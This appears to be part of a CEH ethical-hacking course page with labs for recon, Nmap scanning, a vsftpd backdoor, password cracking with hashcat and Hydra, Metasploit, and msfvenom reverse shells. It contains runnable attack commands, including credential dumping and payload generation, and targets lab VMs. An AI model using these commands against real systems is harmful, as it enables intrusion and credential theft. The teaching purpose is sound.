+<span class="cm"># Email format discovery: hunter.io, phonebook.cz</span>
+            </div>
+          </div>
+        </li>
+        <li class="step">
+          <span class="sn">5</span>
+          <div class="sc">
+            <div class="st">Shodan — Find Exposed Services Without Touching Target</div>
+            <div class="code" data-label="shodan CLI">
+<span class="cm"># Install Shodan CLI</span>
+<span class="cmd">pip3 install</span> shodan <span class="flag">--break-system-packages</span>
+<span class="cmd">shodan init</span> YOUR_API_KEY
+
+<span class="cm"># Search by organization name</span>
+<span class="cmd">shodan search</span> org:<span class="val">"Target Company Name"</span>
+
+<span class="cm"># Search by IP range (your authorized target's CIDR)</span>
+<span class="cmd">shodan search</span> net:<span class="val">176.28.50.0/24</span>
+
+<span class="cm"># Find all RDP servers in a company's ASN</span>
+<span class="cmd">shodan search</span> org:<span class="val">"TargetOrg"</span> port:<span class="val">3389</span>
+<span class="cm"># Output: IPs, open ports, banners, running services, CVEs</span>
+            </div>
+          </div>
+        </li>
+        <li class="step">
+          <span class="sn">6</span>
+          <div class="sc">
+            <div class="st">Google Dorking — Find Sensitive Exposed Information</div>
+            <div class="code" data-label="google dorks">
+<span class="cm"># Login portals</span>
+<span class="val">site:target.com inurl:login</span>
+<span class="val">site:target.com intitle:"admin panel"</span>
+
+<span class="cm"># Exposed files</span>
+<span class="val">site:target.com filetype:pdf "confidential"</span>
+<span class="val">site:target.com filetype:xls "password"</span>
+<span class="val">site:target.com filetype:env</span>
+
+<span class="cm"># Config files & directories</span>
+<span class="val">site:target.com inurl:wp-config.php</span>
+<span class="val">site:target.com intitle:"index of" "/backup"</span>
+<span class="val">site:target.com intitle:"index of" ".git"</span>
+
+<span class="cm"># Cached/archived pages</span>
+<span class="val">cache:target.com</span>
+<span class="cm"># Also check: web.archive.org (Wayback Machine)</span>
+            </div>
+          </div>
+        </li>
+        <li class="step">
+          <span class="sn">7</span>
+          <div class="sc">
+            <div class="st">Build a Recon Report — Document Everything Found</div>
+            <div class="code" data-label="recon findings template">
+<span class="kw">TARGET:</span>        testphp.vulnweb.com / vulnweb.com
+<span class="kw">IP:</span>            176.28.50.165
+<span class="kw">Hosting:</span>       Hostway Romania (AS28709)
+<span class="kw">Registrar:</span>     GoDaddy | Registered: 2007
+<span class="kw">Email format:</span>  firstname.lastname@acunetix.com (from LinkedIn)
+<span class="kw">Staff found:</span>   12 employees on LinkedIn (devs, IT admins)
+<span class="kw">Subdomains:</span>    app.vulnweb.com, api.vulnweb.com, dev.vulnweb.com
+<span class="kw">DNS:</span>           Zone transfer blocked. NS: ns1/ns2.hostway.net
+<span class="kw">Tech stack:</span>    Apache/2.4.7, PHP/5.4, MySQL (via HTTP headers)
+<span class="kw">Shodan:</span>        Port 80,443 open. No patch headers. Apache 2.4.7 (old!)
+<span class="kw">Exposed files:</span> /backup/ dir accessible, /admin/ login page found
+            </div>
+          </div>
+        </li>
+      </ol>
+    </div>
+  </div>
+</div>
+
+<hr class="hdiv">
+
+<!-- ══════════════════
+03 — Scanning & Enumeration
+══════════════════ -->
+<div class="section" id="s3">
+  <div class="sec-head">
+    <span class="sec-num">03</span>
+    <div class="sec-meta">
+      <div class="sec-title">Scanning & Enumeration</div>
+      <div class="sec-sub">Nmap mastery, service detection, OS fingerprinting, and SMB/SNMP enumeration</div>
+    </div>
+    <span class="badge b-orange">Phase 2–3</span>
+  </div>
+
+  <div class="theory orange">
+    <h4>Scanning vs Enumeration</h4>
+    <p><strong>Scanning</strong> discovers live hosts, open ports, running services, and OS types. It answers: "What is up and what ports are open?" <strong>Enumeration</strong> extracts detailed information from running services — usernames, shares, groups, policies, application versions, routing information. It answers: "What exactly is running, and what can I learn from it?"</p>
+  </div>
+
+  <div class="practical open">
+    <div class="prac-head" onclick="toggleP(this)">
+      <span class="ph-i">🗺️</span>
+      <span class="ph-t">Lab 3.1 — Nmap Full Reconnaissance (Host Discovery → Service Fingerprint)</span>
+      <span class="ph-tag pt-cmd">Nmap</span>
+      <span class="ph-chev">▶</span>
+    </div>
+    <div class="prac-body">
+      <div class="note red"><span class="ni">⚠</span><span>Run against Metasploitable2 VM on your local host-only network (e.g., 192.168.56.101). Never scan external IPs without authorization.</span></div>
+      <ol class="steps" style="margin-top:14px;">
+        <li class="step">
+          <span class="sn">1</span>
+          <div class="sc">
+            <div class="st">Step 1 — Host Discovery (Is the Target Up?)</div>
+            <div class="code" data-label="bash">
+<span class="cm"># Ping sweep — find all live hosts in subnet</span>
+<span class="cmd">nmap</span> <span class="flag">-sn</span> 192.168.56.0/24
+<span class="cm"># -sn: no port scan, just host discovery</span>
+
+<span class="cm"># Specific target — confirm it's up</span>
+<span class="cmd">nmap</span> <span class="flag">-sn</span> 192.168.56.101
+<span class="out"># Host is up (0.00045s latency).</span>
+            </div>
+          </div>
+        </li>
+        <li class="step">
+          <span class="sn">2</span>
+          <div class="sc">
+            <div class="st">Step 2 — TCP SYN Scan (Stealth Scan)</div>
+            <div class="code" data-label="bash">
+<span class="cm"># SYN scan — most common, faster, less noisy (sends SYN, doesn't complete handshake)</span>
+<span class="cmd">nmap</span> <span class="flag">-sS</span> 192.168.56.101
+<span class="cm"># Requires root/sudo</span>
+
+<span class="cm"># Scan specific port ranges</span>
+<span class="cmd">nmap</span> <span class="flag">-sS -p</span> 1-65535 192.168.56.101   <span class="cm"># all ports</span>
+<span class="cmd">nmap</span> <span class="flag">-sS -p</span> 22,80,443,3306 192.168.56.101  <span class="cm"># specific</span>
+<span class="cmd">nmap</span> <span class="flag">-sS --top-ports</span> 1000 192.168.56.101   <span class="cm"># top 1000</span>
+            </div>
+          </div>
+        </li>
+        <li class="step">
+          <span class="sn">3</span>
+          <div class="sc">
+            <div class="st">Step 3 — Service & Version Detection</div>
+            <div class="code" data-label="bash">
+<span class="cm"># -sV: probe open ports to determine service/version</span>
+<span class="cmd">nmap</span> <span class="flag">-sV</span> 192.168.56.101
+<span class="out"># 21/tcp  open  ftp     vsftpd 2.3.4  ← KNOWN VULNERABLE</span>
+<span class="out"># 22/tcp  open  ssh     OpenSSH 4.7p1</span>
+<span class="out"># 80/tcp  open  http    Apache httpd 2.2.8</span>
+<span class="out"># 139/tcp open  netbios-ssn Samba smbd 3.X</span>
+<span class="out"># 3306/tcp open mysql   MySQL 5.0.51a</span>
+<span class="out"># 5900/tcp open vnc     VNC protocol 3.3</span>
+            </div>
+          </div>
+        </li>
+        <li class="step">
+          <span class="sn">4</span>
+          <div class="sc">
+            <div class="st">Step 4 — OS Fingerprinting</div>
+            <div class="code" data-label="bash">
+<span class="cm"># -O: OS detection (requires root)</span>
+<span class="cmd">nmap</span> <span class="flag">-O</span> 192.168.56.101
+<span class="out"># OS: Linux 2.6.X</span>
+<span class="out"># OS details: Linux 2.6.9 - 2.6.33</span>
+
+<span class="cm"># Aggressive scan — all in one (OS + version + scripts + traceroute)</span>
+<span class="cmd">nmap</span> <span class="flag">-A</span> 192.168.56.101 <span class="flag">-oN</span> scan-results.txt
+            </div>
+          </div>
+        </li>
+        <li class="step">
+          <span class="sn">5</span>
+          <div class="sc">
+            <div class="st">Step 5 — NSE Scripts for Vulnerability Detection</div>
+            <div class="code" data-label="bash">
+<span class="cm"># Run default NSE scripts</span>
+<span class="cmd">nmap</span> <span class="flag">-sC</span> 192.168.56.101
+
+<span class="cm"># Specific vulnerability scripts</span>
+<span class="cmd">nmap</span> <span class="flag">--script</span> vuln 192.168.56.101      <span class="cm"># run all vuln scripts</span>
+<span class="cmd">nmap</span> <span class="flag">--script</span> ftp-vsftpd-backdoor 192.168.56.101   <span class="cm"># vsftpd 2.3.4</span>
+<span class="cmd">nmap</span> <span class="flag">--script</span> smb-vuln-ms17-010 192.168.56.101     <span class="cm"># EternalBlue</span>
+<span class="cmd">nmap</span> <span class="flag">--script</span> http-sql-injection 192.168.56.101     <span class="cm"># SQL injection</span>
+<span class="cmd">nmap</span> <span class="flag">--script</span> ssh-brute <span class="flag">--script-args</span> passdb=/usr/share/wordlists/rockyou.txt 192.168.56.101
+            </div>
+          </div>
+        </li>
+        <li class="step">
+          <span class="sn">6</span>
+          <div class="sc">
+            <div class="st">Step 6 — SMB Enumeration with Enum4Linux</div>
+            <div class="code" data-label="bash">
+<span class="cm"># Enumerate SMB shares, users, groups, OS info</span>
+<span class="cmd">enum4linux</span> <span class="flag">-a</span> 192.168.56.101
+<span class="cm"># -a: do all simple enumeration</span>
+<span class="cm"># Output: OS version, workgroup, share list, users, groups, password policy</span>
+
+<span class="cm"># Targeted SMB user enumeration</span>
+<span class="cmd">enum4linux</span> <span class="flag">-U</span> 192.168.56.101   <span class="cm"># users only</span>
+<span class="cmd">enum4linux</span> <span class="flag">-S</span> 192.168.56.101   <span class="cm"># shares only</span>
+
+<span class="cm"># List SMB shares with no credentials</span>
+<span class="cmd">smbclient</span> <span class="flag">-L</span> //192.168.56.101 <span class="flag">-N</span>
+<span class="cm"># -N: no password (null session)</span>
+            </div>
+          </div>
+        </li>
+        <li class="step">
+          <span class="sn">7</span>
+          <div class="sc">
+            <div class="st">Step 7 — SNMP Enumeration</div>
+            <div class="code" data-label="bash">
+<span class="cm"># SNMP community string brute force</span>
+<span class="cmd">onesixtyone</span> <span class="flag">-c</span> /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt 192.168.56.101
+<span class="cm"># Common community strings: public, private, manager, community</span>
+
+<span class="cm"># SNMP walk — dump all OIDs (huge amount of info)</span>
+<span class="cmd">snmpwalk</span> <span class="flag">-c</span> public <span class="flag">-v1</span> 192.168.56.101
+<span class="cm"># Reveals: running processes, installed packages, users, network interfaces</span>
+            </div>
+          </div>
+        </li>
+      </ol>
+    </div>
+  </div>
+</div>
+
+<hr class="hdiv">
+
+<!-- ══════════════════
+04 — System Hacking
+══════════════════ -->
+<div class="section" id="s4">
+  <div class="sec-head">
+    <span class="sec-num">04</span>
+    <div class="sec-meta">
+      <div class="sec-title">System Hacking</div>
+      <div class="sec-sub">Exploiting known vulnerabilities to gain initial system access</div>
+    </div>
+    <span class="badge b-red">Phase 4</span>
+  </div>
+
+  <div class="theory">
+    <h4>The Exploitation Phase</h4>
+    <p>Exploitation uses <em>identified vulnerabilities</em> from the scanning phase to gain unauthorized access. A real penetration tester <strong>always checks whether a vulnerability is exploitable in context</strong> before exploiting it — a CVSS 9.8 vulnerability in a firewalled internal service may be less critical than a CVSS 6.5 in a public-facing login page.</p>
+    <p>For CEH, the focus is on understanding how common exploit classes work — buffer overflows, command injection, misconfigured services — not on writing custom exploits from scratch.</p>
+  </div>
+
+  <div class="practical open">
+    <div class="prac-head" onclick="toggleP(this)">
+      <span class="ph-i">💥</span>
+      <span class="ph-t">Lab 4.1 — Exploit vsftpd 2.3.4 Backdoor (Manual)</span>
+      <span class="ph-tag pt-lab">CVE Lab</span>
+      <span class="ph-chev">▶</span>
+    </div>
+    <div class="prac-body">
+      <div class="note yellow"><span class="ni">📚</span><span><strong>Learning context:</strong> vsftpd 2.3.4 was backdoored in 2011. Connecting with a username containing ":)" triggers a backdoor shell on port 6200. Classic example of supply chain attack. <span class="cve">CVE-2011-2523</span> — Metasploitable2 is vulnerable.</span></div>
+      <ol class="steps" style="margin-top:14px;">
+        <li class="step">
+          <span class="sn">1</span>
+          <div class="sc">
+            <div class="st">Confirm vsftpd 2.3.4 is Running</div>
+            <div class="code" data-label="bash">
+<span class="cmd">nmap</span> <span class="flag">-sV -p</span> 21 192.168.56.101
+<span class="out"># 21/tcp open  ftp  vsftpd 2.3.4</span>
+            </div>
+          </div>
+        </li>
+        <li class="step">
+          <span class="sn">2</span>
+          <div class="sc">
+            <div class="st">Trigger the Backdoor Manually</div>
+            <div class="code" data-label="bash">
+<span class="cm"># Connect to FTP and send backdoor trigger in username</span>
+<span class="cmd">nc</span> 192.168.56.101 21
+<span class="out"># 220 (vsFTPd 2.3.4)</span>
+USER <span class="hi">backdoor:)</span>
+<span class="out"># 331 Please specify the password.</span>
+PASS <span class="val">anything</span>
+<span class="cm"># Now connect to the backdoor port in another terminal</span>
+<span class="cmd">nc</span> 192.168.56.101 6200
+<span class="out"># You now have a root shell!</span>
+<span class="cmd">id</span>
+<span class="out"># uid=0(root) gid=0(root)</span>
+            </div>
+          </div>
+        </li>
+        <li class="step">
+          <span class="sn">3</span>
+          <div class="sc">
+            <div class="st">Document the Finding for Your VAPT Report</div>
+            <div class="code" data-label="finding documentation">
+<span class="kw">Vulnerability:</span>   vsftpd 2.3.4 Backdoor Command Execution
+<span class="kw">CVE:</span>             CVE-2011-2523
+<span class="kw">CVSS Score:</span>      10.0 CRITICAL
+<span class="kw">Affected:</span>        192.168.56.101 — Port 21 (FTP)
+<span class="kw">Impact:</span>          Remote unauthenticated root shell access
+<span class="kw">Evidence:</span>        [Screenshot of id command showing root]
+<span class="kw">Remediation:</span>     Upgrade to vsftpd 3.0.3+. Disable FTP if not required.
+                 Replace with SFTP (SSH file transfer).
+            </div>
+          </div>
+        </li>
+      </ol>
+    </div>
+  </div>
+
+  <div class="practical">
+    <div class="prac-head" onclick="toggleP(this)">
+      <span class="ph-i">💥</span>
+      <span class="ph-t">Lab 4.2 — EternalBlue (MS17-010) Exploitation Explained</span>
+      <span class="ph-tag pt-theory">Concept Lab</span>
+      <span class="ph-chev">▶</span>
+    </div>
+    <div class="prac-body">
+      <div class="note yellow"><span class="ni">📚</span><span><span class="cve">CVE-2017-0144</span> — EternalBlue is the NSA-developed exploit used in WannaCry ransomware (2017). It exploits SMBv1 buffer overflow for remote code execution. Affects unpatched Windows XP–Windows Server 2016. Used against Windows targets in Metasploitable3 or vulnerable Windows VMs.</span></div>
+      <ol class="steps" style="margin-top:14px;">
+        <li class="step">
+          <span class="sn">1</span>
+          <div class="sc">
+            <div class="st">Detect EternalBlue Vulnerability with Nmap</div>
+            <div class="code" data-label="bash">
+<span class="cm"># Check if target is vulnerable to MS17-010</span>
+<span class="cmd">nmap</span> <span class="flag">-p</span> 445 <span class="flag">--script</span> smb-vuln-ms17-010 <span class="val">TARGET_IP</span>
+<span class="out"># VULNERABLE: Remote Code Execution vulnerability in Microsoft SMBv1</span>
+<span class="out"># State: VULNERABLE</span>
+<span class="out"># Risk factor: HIGH</span>
+            </div>
+          </div>
+        </li>
+        <li class="step">
+          <span class="sn">2</span>
+          <div class="sc">
+            <div class="st">Exploitation via Metasploit (covered in Module 06)</div>
+            <div class="sd">The actual exploitation uses <code style="color:var(--cyan)">exploit/windows/smb/ms17_010_eternalblue</code> in Metasploit. We cover this fully in Lab 6.2.</div>
+          </div>
+        </li>
+        <li class="step">
+          <span class="sn">3</span>
+          <div class="sc">
+            <div class="st">Key Learning Points for CEH Exam</div>
+            <div class="code" data-label="key facts">
+<span class="kw">What it exploits:</span>   SMBv1 buffer overflow in srv.sys
+<span class="kw">Attack surface:</span>     Port 445 (SMB) open to attacker
+<span class="kw">Result:</span>             SYSTEM-level access (highest Windows privilege)
+<span class="kw">Real-world use:</span>     WannaCry (2017), NotPetya (2017)
+<span class="kw">Prevention:</span>         Disable SMBv1 (KB4012212 patch),
+                    Block port 445 at perimeter firewall,
+                    Apply MS17-010 patch immediately
+<span class="kw">Nmap script:</span>       smb-vuln-ms17-010
+<span class="kw">Metasploit module:</span>  exploit/windows/smb/ms17_010_eternalblue
+            </div>
+          </div>
+        </li>
+      </ol>
+    </div>
+  </div>
+</div>
+
+<hr class="hdiv">
+
+<!-- ══════════════════
+05 — Password Attacks
+══════════════════ -->
+<div class="section" id="s5">
+  <div class="sec-head">
+    <span class="sec-num">05</span>
+    <div class="sec-meta">
+      <div class="sec-title">Password Attacks</div>
+      <div class="sec-sub">Hash cracking, brute force, credential stuffing, and password spraying</div>
+    </div>
+    <span class="badge b-yellow">Credential</span>
+  </div>
+
+  <div class="theory yellow">
+    <h4>Password Attack Types</h4>
+    <p><strong>Brute force:</strong> Try every possible combination — slow but exhaustive. Effective against short/simple passwords.</p>
+    <p><strong>Dictionary attack:</strong> Use a wordlist of common passwords (rockyou.txt has 14 million). Fastest for weak passwords.</p>
+    <p><strong>Rule-based:</strong> Apply mutations to wordlist — capitalize first letter, add numbers at end, substitute o→0, a→@. Mimics how users create "complex" passwords.</p>
+    <p><strong>Rainbow tables:</strong> Precomputed hash→password lookups. Fast but defeated by salting.</p>
+    <p><strong>Credential stuffing:</strong> Use leaked username:password pairs from breaches against other services. Works because people reuse passwords.</p>
+    <p><strong>Password spraying:</strong> Try one common password against many accounts. Avoids account lockout that brute force triggers.</p>
+  </div>
+
+  <div class="practical open">
+    <div class="prac-head" onclick="toggleP(this)">
+      <span class="ph-i">🔑</span>
+      <span class="ph-t">Lab 5.1 — Hash Cracking with Hashcat and John the Ripper</span>
+      <span class="ph-tag pt-tool">Password Lab</span>
+      <span class="ph-chev">▶</span>
+    </div>
+    <div class="prac-body">
+      <ol class="steps">
+        <li class="step">
+          <span class="sn">1</span>
+          <div class="sc">
+            <div class="st">Identify Hash Type</div>
+            <div class="code" data-label="bash">
+<span class="cm"># Use hash-identifier or hashcat --help</span>
+<span class="cmd">hash-identifier</span>
+<span class="cm"># Paste the hash and it tells you the type</span>
+
+<span class="cm"># Common hash examples:</span>
+<span class="cm"># MD5:    d8578edf8458ce06fbc5bb76a58c5ca4  (32 chars)</span>
+<span class="cm"># SHA1:   5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8  (40 chars)</span>
+<span class="cm"># SHA256: 65e84be33532fb784c48129675f9eff3a682b27168... (64 chars)</span>
+<span class="cm"># NTLM:   8846F7EAEE8FB117AD06BDD830B7586C  (32 chars, Windows)</span>
+<span class="cm"># bcrypt: $2a$10$... (60 chars, starts with $2a$ or $2b$)</span>
+            </div>
+          </div>
+        </li>
+        <li class="step">
+          <span class="sn">2</span>
+          <div class="sc">
+            <div class="st">Crack MD5 Hash with Hashcat (GPU-accelerated)</div>
+            <div class="code" data-label="bash">
+<span class="cm"># Create a file with the hash to crack</span>
+<span class="cmd">echo</span> <span class="val">"d8578edf8458ce06fbc5bb76a58c5ca4"</span> > hash.txt
+
+<span class="cm"># Straight dictionary attack</span>
+<span class="cmd">hashcat</span> <span class="flag">-m 0</span> hash.txt /usr/share/wordlists/rockyou.txt
+<span class="cm"># -m 0: MD5 | -m 1000: NTLM | -m 1800: SHA-512 | -m 3200: bcrypt</span>
+
+<span class="cm"># Rule-based attack (best-64.rule mutates the wordlist)</span>
+<span class="cmd">hashcat</span> <span class="flag">-m 0</span> hash.txt /usr/share/wordlists/rockyou.txt \
+  <span class="flag">-r</span> /usr/share/hashcat/rules/best64.rule
+
+<span class="cm"># Brute force all 6-char passwords</span>
+<span class="cmd">hashcat</span> <span class="flag">-m 0 -a 3</span> hash.txt <span class="val">?a?a?a?a?a?a</span>
+<span class="cm"># ?a = all printable chars, ?d = digits, ?l = lowercase, ?u = uppercase</span>
+            </div>
+          </div>
+        </li>
+        <li class="step">
+          <span class="sn">3</span>
+          <div class="sc">
+            <div class="st">Crack with John the Ripper</div>
+            <div class="code" data-label="bash">
+<span class="cm"># Auto-detect hash type and crack</span>
+<span class="cmd">john</span> hash.txt <span class="flag">--wordlist</span>=/usr/share/wordlists/rockyou.txt
+
+<span class="cm"># Crack a /etc/shadow file (Linux passwords)</span>
+<span class="cmd">unshadow</span> /etc/passwd /etc/shadow > combined.txt
+<span class="cmd">john</span> combined.txt <span class="flag">--wordlist</span>=/usr/share/wordlists/rockyou.txt
+
+<span class="cm"># Show cracked passwords</span>
+<span class="cmd">john</span> <span class="flag">--show</span> hash.txt
+            </div>
+          </div>
+        </li>
+        <li class="step">
+          <span class="sn">4</span>
+          <div class="sc">
+            <div class="st">Brute Force SSH Login with Hydra</div>
+            <div class="code" data-label="bash">
+<span class="cm"># Brute force SSH (against Metasploitable2 only)</span>
+<span class="cmd">hydra</span> <span class="flag">-l</span> msfadmin <span class="flag">-P</span> /usr/share/wordlists/rockyou.txt \
+  <span class="flag">-t</span> 4 <span class="flag">-V</span> ssh://192.168.56.101
+<span class="cm"># -l: username | -P: password list | -t: threads | -V: verbose</span>
+
+<span class="cm"># Brute force HTTP POST login (e.g., DVWA)</span>
+<span class="cmd">hydra</span> <span class="flag">-l</span> admin <span class="flag">-P</span> /usr/share/wordlists/rockyou.txt \
+  192.168.56.102 http-post-form \
+  <span class="val">"/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login Failed"</span>
+<span class="cm"># Format: URL:POST_params:Failed_string</span>
+            </div>
+          </div>
+        </li>
+      </ol>
+    </div>
+  </div>
+</div>
+
+<hr class="hdiv">
+
+<!-- ══════════════════
+06 — Metasploit
+══════════════════ -->
+<div class="section" id="s6">
+  <div class="sec-head">
+    <span class="sec-num">06</span>
+    <div class="sec-meta">
+      <div class="sec-title">Metasploit Framework</div>
+      <div class="sec-sub">msfconsole, payloads, Meterpreter sessions, and post-exploitation modules</div>
+    </div>
+    <span class="badge b-red">Core Tool</span>
+  </div>
+
+  <div class="theory">
+    <h4>Metasploit Architecture</h4>
+    <p><strong>Metasploit</strong> is the world's most used penetration testing framework. It contains 2,000+ exploits, 1,000+ payloads, and 400+ auxiliary modules. Understanding its architecture is essential for both using it and explaining how it works in interviews.</p>
+    <p>Components: <strong>Exploit</strong> = the attack code. <strong>Payload</strong> = code that runs after exploitation (your shell). <strong>Auxiliary</strong> = scanners, fuzzers, tools (no payload). <strong>Post</strong> = post-exploitation modules. <strong>Encoder</strong> = evades AV by encoding payload. <strong>Nop</strong> = no-operation sled for buffer overflows.</p>
+  </div>
+
+  <div class="grid">
+    <div class="card">
+      <div class="ck">Single Payload</div>
+      <div class="cv">Self-contained — all code in one. <code style="color:var(--cyan)">windows/shell_reverse_tcp</code>. Limited features, smaller size. Good for constrained environments.</div>
+    </div>
+    <div class="card">
+      <div class="ck o">Staged Payload</div>
+      <div class="cv">Two-part: small stager sends first, then downloads second stage (Meterpreter). <code style="color:var(--cyan)">windows/meterpreter/reverse_tcp</code>. More features, requires more network access.</div>
+    </div>
+    <div class="card">
+      <div class="ck g">Meterpreter</div>
+      <div class="cv">Advanced payload running in memory — no file on disk. Encrypted communications. Supports: file upload/download, screenshot, keylogger, pivot, hashdump, shell.</div>
+    </div>
+    <div class="card">
+      <div class="ck b">Reverse Shell</div>
+      <div class="cv">Target connects BACK to attacker. Bypasses firewall (outbound usually allowed). Most common payload type. Attacker sets up listener first.</div>
+    </div>
+    <div class="card">
+      <div class="ck c">Bind Shell</div>
+      <div class="cv">Payload opens a listening port on target. Attacker connects TO target. Blocked by inbound firewall rules. Less common in external engagements.</div>
+    </div>
+    <div class="card">
+      <div class="ck v">msfvenom</div>
+      <div class="cv">Standalone payload generator. Creates malicious files (exe, pdf, apk, python, etc.) with embedded shellcode. Used when Metasploit module doesn't exist for delivery.</div>
+    </div>
+  </div>
+
+  <div class="practical open">
+    <div class="prac-head" onclick="toggleP(this)">
+      <span class="ph-i">🐉</span>
+      <span class="ph-t">Lab 6.1 — Metasploit Full Attack Workflow on Metasploitable2</span>
+      <span class="ph-tag pt-lab">Metasploit Lab</span>
+      <span class="ph-chev">▶</span>
+    </div>
+    <div class="prac-body">
+      <ol class="steps">
+        <li class="step">
+          <span class="sn">1</span>
+          <div class="sc">
+            <div class="st">Start Metasploit and Set Up Workspace</div>
+            <div class="code" data-label="kali bash">
+<span class="cm"># Start PostgreSQL (Metasploit database)</span>
+<span class="cmd">sudo service postgresql start</span>
+<span class="cmd">msfdb init</span>
+
+<span class="cm"># Launch Metasploit console</span>
+<span class="cmd">msfconsole</span>
+
+<span class="cm"># Create and use a workspace</span>
+msf6> <span class="cmd">workspace</span> <span class="flag">-a</span> metasploitable-lab
+msf6> <span class="cmd">workspace</span> metasploitable-lab
+            </div>
+          </div>
+        </li>
+        <li class="step">
+          <span class="sn">2</span>
+          <div class="sc">
+            <div class="st">Import Nmap Results and Find Exploits</div>
+            <div class="code" data-label="msfconsole">
+<span class="cm"># Import previous Nmap scan</span>
+msf6> <span class="cmd">db_import</span> scan-results.xml
+
+<span class="cm"># Check what hosts were discovered</span>
+msf6> <span class="cmd">hosts</span>
+
+<span class="cm"># Search for exploit by service/CVE</span>
+msf6> <span class="cmd">search</span> vsftpd
+msf6> <span class="cmd">search</span> ms17-010
+msf6> <span class="cmd">search</span> type:exploit platform:linux name:unreal
+            </div>
+          </div>
+        </li>
+        <li class="step">
+          <span class="sn">3</span>
+          <div class="sc">
+            <div class="st">Exploit vsftpd 2.3.4 via Metasploit</div>
+            <div class="code" data-label="msfconsole">
+<span class="cm"># Select the module</span>
+msf6> <span class="cmd">use</span> exploit/unix/ftp/vsftpd_234_backdoor
+
+<span class="cm"># Show required options</span>
+msf6> <span class="cmd">show options</span>
+msf6> <span class="cmd">set RHOSTS</span> 192.168.56.101
+msf6> <span class="cmd">set RPORT</span> 21
+
+<span class="cm"># Run the exploit</span>
+msf6> <span class="cmd">run</span>
+<span class="out"># [*] Command shell session 1 opened</span>
+<span class="out"># uid=0(root) gid=0(root)</span>
+            </div>
+          </div>
+        </li>
+        <li class="step">
+          <span class="sn">4</span>
+          <div class="sc">
+            <div class="st">Upgrade to Meterpreter for Advanced Post-Exploitation</div>
+            <div class="code" data-label="msfconsole">
+<span class="cm"># Background the current shell session</span>
+msf6> <span class="cmd">background</span>  <span class="cm"># or CTRL+Z</span>
+
+<span class="cm"># Upgrade shell to Meterpreter</span>
+msf6> <span class="cmd">use</span> post/multi/manage/shell_to_meterpreter
+msf6> <span class="cmd">set SESSION</span> 1
+msf6> <span class="cmd">run</span>
+
+<span class="cm"># Interact with Meterpreter</span>
+msf6> <span class="cmd">sessions</span> <span class="flag">-i</span> 2
+meterpreter> <span class="cmd">sysinfo</span>
+meterpreter> <span class="cmd">getuid</span>
+meterpreter> <span class="cmd">hashdump</span>          <span class="cm"># dump password hashes</span>
+meterpreter> <span class="cmd">download</span> /etc/shadow /tmp/shadow.txt
+meterpreter> <span class="cmd">shell</span>              <span class="cm"># drop to system shell</span>
+            </div>
+          </div>
+        </li>
+        <li class="step">
+          <span class="sn">5</span>
+          <div class="sc">
+            <div class="st">Generate a Custom Payload with msfvenom</div>
+            <div class="code" data-label="bash">
+<span class="cm"># Linux reverse shell ELF</span>
+<span class="cmd">msfvenom</span> <span class="flag">-p</span> linux/x86/meterpreter/reverse_tcp \
+  LHOST=<span class="val">192.168.56.1</span> LPORT=<span class="val">4444</span> \
+  <span class="flag">-f</span> elf <span class="flag">-o</span> shell.elf
+
+<span class="cm"># Windows reverse shell EXE</span>
+<span class="cmd">msfvenom</span> <span class="flag">-p</span> windows/meterpreter/reverse_tcp \
+  LHOST=<span class="val">192.168.56.1</span> LPORT=<span class="val">4444</span> \
+  <span class="flag">-f</span> exe <span class="flag">-o</span> payload.exe
+
+<span class="cm"># Listener to catch connections</span>
+msf6> <span class="cmd">use</span> exploit/multi/handler
+msf6> <span class="cmd">set PAYLOAD</span> linux/x86/meterpreter/reverse_tcp
+msf6> <span class="cmd">set LHOST</span> 192.168.56.1
+msf6> <span class="cmd">set LPORT</span> 4444
+msf6> <span class="cmd">run</span>
+            </div>
+          </div>
+        </li>
+      </ol>
+    </div>
+  </div>
+</div>
+
+<hr class="hdiv">
+
+<!-- ══════════════════
+07 — Web App Hacking
+══════════════════ -->
+<div class="section" id="s7">
+  <div class="sec-head">
+    <span class="sec-num">07</span>
+    <div class="sec-meta">
+      <div class="sec-title">Web Application Hacking</div>
+      <div class="sec-sub">OWASP Top 10, SQL injection, XSS, Burp Suite workflow, and API testing</div>
+    </div>
+    <span class="badge b-orange">OWASP</span>
+  </div>
+
+  <div class="theory orange">
+    <h4>Web App Attacks Are #1 Attack Vector</h4>
+    <p>Web applications are the primary attack surface for external adversaries — they're public-facing, complex, and often contain business logic flaws alongside technical vulnerabilities. The <strong>OWASP Top 10</strong> is the definitive reference for web application security risks and is heavily tested in CEH v13.</p>
+  </div>
+
+  <ul class="owasp-list">
+    <li class="owasp-item">
+      <div class="oi-rank">A01</div>
+      <div class="oi-body">
+        <div class="oi-name">Broken Access Control</div>
+        <div class="oi-desc">Users can access resources or perform actions beyond their permissions. IDOR (Insecure Direct Object Reference), privilege escalation, forced browsing to admin pages.</div>
+        <span class="oi-tag b-red">Lab: DVWA File Inclusion</span>
+      </div>
+    </li>
+    <li class="owasp-item">
+      <div class="oi-rank">A02</div>
+      <div class="oi-body">
+        <div class="oi-name">Cryptographic Failures</div>
+        <div class="oi-desc">Sensitive data exposed due to weak/absent encryption. HTTP instead of HTTPS, MD5 hashed passwords without salt, sensitive data in URLs, weak TLS cipher suites.</div>
+        <span class="oi-tag b-yellow">Lab: Inspect HTTP traffic in Wireshark</span>
+      </div>
+    </li>
+    <li class="owasp-item">
+      <div class="oi-rank">A03</div>
+      <div class="oi-body">
+        <div class="oi-name">Injection (SQL, Command, LDAP)</div>
+        <div class="oi-desc">Untrusted data sent to an interpreter. <strong>SQL injection</strong> most common — attacker manipulates database queries. Command injection runs OS commands. LDAP injection bypasses auth.</div>
+        <span class="oi-tag b-red">Lab: SQLi on DVWA / sqlmap</span>
+      </div>
+    </li>
+    <li class="owasp-item">
+      <div class="oi-rank">A07</div>
+      <div class="oi-body">
+        <div class="oi-name">Cross-Site Scripting (XSS)</div>
+        <div class="oi-desc">Attacker injects malicious scripts into web pages viewed by others. <strong>Reflected</strong> (non-persistent), <strong>Stored</strong> (persistent in DB), <strong>DOM-based</strong> (client-side manipulation). Used for cookie theft, session hijacking.</div>
+        <span class="oi-tag b-orange">Lab: Stored XSS on DVWA</span>
+      </div>
+    </li>
+    <li class="owasp-item">
+      <div class="oi-rank">A05</div>
+      <div class="oi-body">
+        <div class="oi-name">Security Misconfiguration</div>
+        <div class="oi-desc">Default credentials, directory listing enabled, error messages exposing stack traces, cloud storage publicly accessible, unnecessary services enabled.</div>
